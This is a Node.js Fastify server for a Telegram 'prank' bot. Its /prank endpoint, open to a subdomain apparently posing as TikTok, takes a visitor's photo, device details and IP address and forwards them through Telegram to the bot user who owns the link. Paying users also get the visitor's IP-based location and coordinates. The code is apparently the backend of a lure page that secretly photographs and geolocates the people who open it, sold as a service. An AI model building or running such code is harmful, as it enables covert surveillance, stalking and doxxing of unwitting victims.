const fs = require("fs");

const { resolve } = require('path');
const { I18n } = require('@starkow/i18n');
const axios = require("axios");

let options = {
    localesPath: resolve(__dirname, './../locales'),
    currentLocale: 'en',
    defaultLocale: 'en',
    throwOnFailure: true,
};

const fastify = require('fastify')({
    https: {
        key: fs.readFileSync(`${__dirname}/key.pem`),
        cert: fs.readFileSync(`${__dirname}/certificate.pem`)
    }
});

const {
    InlineKeyboard,
    Telegram,
    InlineKeyboardBuilder,
    MessageContext,
    Markdown,
    MediaSource,
    KeyboardBuilder
} = require('puregram');

const { User } = require("../database/models");
const { isVip, getLocationByIP } = require("../utils/helpers");
const HiViews = require("../services/hiviews");

require('dotenv').config();

const telegram = Telegram.fromToken(process.env.TELEGRAM_BOT_TOKEN);

fastify.register(require('@fastify/cors'), {
    origin: (origin, callback) => {

        const regex = /^https?:\/\/([a-zA-Z0-9-]+)\.fearby\.su$/;

        if (regex.test(origin) || origin === 'https://fearby.su') {
            callback(null, true);
        } else {
            callback(new Error("Неверная ссылка в origin"), false);
        }
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'access-control-allow-origin'],
    credentials: true
});

fastify.options('/prank', (request, reply) => {
    reply.header("Access-Control-Allow-Origin", "https://tiktok.fearby.su");
    reply.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    reply.header("Access-Control-Allow-Headers", "Content-Type, Authorization, access-control-allow-origin");
    reply.header("Access-Control-Allow-Credentials", "true");
    reply.send();
});

fastify.post('/prank', async (request, reply) => {
    const { photo, deviceInfo, ip, id } = request.body;

    const photoData = photo.replace(/^data:image\/\w+;base64,/, "");
    const photoBuffer = Buffer.from(photoData, "base64");

    const user = await User.findOne({ where: { userToken: id } });

    let i18n;

    if(user) {
        const supportedLanguages = ['en', 'ru', 'id', 'ar', 'fr'];

        i18n = new I18n(options);
        i18n.locale = supportedLanguages.includes(user.languageCode) ? user.languageCode : 'en';

        let userVip = isVip(user);

        let location = "";
        let coordinates = "";

        if(userVip) {
            let getLocationData = await getLocationByIP(ip);

            location = getLocationData.location;
            coordinates = getLocationData.coordinates;
        }

        let text = i18n.__("newPhoto", { 
            ip: userVip ? ip : i18n.__("hide"), 
            platform: userVip ? deviceInfo.platform : i18n.__("hide"), 
            premium: userVip ? "" : i18n.__("premiumSuccess"),
            location: userVip ? location : i18n.__("hide"),
            coordinates: userVip ? coordinates : i18n.__("hide"),
        });
        
        let keyboard = new InlineKeyboardBuilder()
            .textButton({ text: i18n.__("complaint"), payload: { command: 'complaint' } }).row()

        if(!userVip) {
            keyboard.textButton({ text: i18n.__("start.keyboard.getPremium"), payload: { command: 'premium' } }).row()
        }

        await SendPostToChat(user.tgId);

        let messageParams = {
            chat_id: user.tgId,
            photo: MediaSource.buffer(photoBuffer),
            parse_mode: "HTML",
            caption: text,
            reply_markup: keyboard
        };

        await telegram.api.sendPhoto(messageParams).catch(error => console.log(error))
    }

    reply.send({ received: "OK" });
});

const start = async () => {
    try {
        await fastify.listen({ host: "0.0.0.0", port: 2087 });
        console.log('Server running!');
    } catch (err) {
        fastify.log.error(err);
        process.exit(1);
    }
};

start();

async function SendPostToChat(chatId) {
    const token = process.env.GRAMADS_TOKEN;

    const sendPostDto = {
        SendToChatId: chatId
    };

    try {
        const response = await axios.post("https://api.gramads.net/ad/SendPost", sendPostDto, {
            headers: {
                Authorization: `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        });

        if (response.status !== 200) {
            return;
        }

        const result = response.data;
    } catch (error) {
        console.error('Ошибка при отправке:', error.message);
    }
}
